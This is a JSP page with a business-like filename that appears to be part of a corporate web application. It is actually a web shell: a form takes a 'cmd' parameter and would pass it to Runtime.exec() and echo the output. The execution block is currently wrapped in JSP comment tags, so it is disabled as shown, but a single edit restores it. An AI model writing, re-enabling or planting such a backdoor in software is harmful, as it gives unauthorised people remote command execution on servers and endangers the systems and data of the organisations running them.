<%@ page contentType="text/xml; charset=UTF-8"%>
<%@ page import="javax.servlet.ServletRequest"%>
<%@ page import="java.io.InputStreamReader"%>
<%@ page import="java.lang.Runtime"%>
<%@ page import="java.lang.Process"%>
<%@ page import="com.hanjin.framework.component.util.JSPUtil"%>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=EUC-KR">
<title>Insert title here</title>
</head>
<body>
<%!
String[] cmds = {"", "", "", "", "", "", "", "", "", ""};
int cmdIdx = 0;
%>
<%
String cmd =JSPUtil.getNull(request.getParameter("cmd"));
if(cmd == null){
	cmd = "";
}
%>
<form name="frm" action="ESM_SPC_INF.jsp" method="POST">
<input type="text" name="cmd" style="width:100%" value="<%=cmd %>" alt="Window : cmd /c  , Unix : ">
</form>
<%--
if(cmd != null && !cmd.equals("")){
	cmds[cmdIdx++] = cmd;
	for(int i = cmds.length - 1 ; i >= 0  ; i--){
		String t = cmds[(cmdIdx+i)%cmds.length];
		if(!t.equals("")){
			//out.println(t+"<BR>");
		}
	}
	cmdIdx = cmdIdx % 10;
--%>
<pre>
<%--
	Runtime run = Runtime.getRuntime();
	Process proc = run.exec(cmd);
	InputStreamReader isr = new InputStreamReader(proc.getInputStream());
	BufferedReader br = new BufferedReader(isr);
	String line = null;
	while((line = br.readLine()) != null){
		line = line.replaceAll("<", "&lt;").replaceAll(">", "&gt;");
		//out.println(line + "");
	}
--%>
</pre>
<%--
}
--%>
</body>
</html>